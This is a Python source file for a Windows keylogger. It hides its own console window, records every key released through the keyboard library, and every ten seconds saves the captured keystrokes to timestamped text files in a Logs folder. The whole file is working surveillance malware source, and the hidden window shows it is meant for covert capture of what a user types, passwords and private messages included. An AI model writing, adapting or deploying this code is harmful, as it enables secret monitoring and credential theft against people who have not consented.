""" This file will register the keystrokes and write them in a file """
from datetime import datetime
from os import chdir
from threading import Timer

import keyboard  # for key logs

import win32gui
import win32con

hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(hide, win32con.SW_HIDE)


class Keylogger:
    def __init__(self):
        self.filename = None
        # this is the string variable that contains the log of all
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetime
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.timer = None

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occurred
        (That is when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space": name = " "
            elif name == "enter": name = "[ENTER]\n"
            elif name == "decimal": name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]\n"
        # finally, add the key name to our global `self.log` variable
        self.log += name + " "

    def update_filename(self):
        self.filename = f"Key_Logger {str(datetime.now()).replace(':', '').replace(' ', '-')}"

    def report_to_file(self):
        print("Reporting")
        """This method creates a log file in the current directory that contains
        the current key logs in the `self.log` variable"""
        # open the file in write mode (create it)
        print("Writing Log")
        chdir("Logs/")
        with open(f"{self.filename}.txt", "w") as f: f.write(self.log)
        chdir("../")
        print(f"[+] Saved Logs to {self.filename}.txt")

        self.timer = Timer(interval=10, function=self.report_to_file)
        # set the thread as daemon (dies when main thread die)
        self.timer.daemon = True
        self.timer.start()

    def start(self):
        self.update_filename()
        keyboard.on_release(callback=self.callback)
        self.report_to_file()
        print(f"{datetime.now()} - Started keylogger")

        keyboard.wait()


if __name__ == '__main__':
    keylogger = Keylogger()
    keylogger.start()
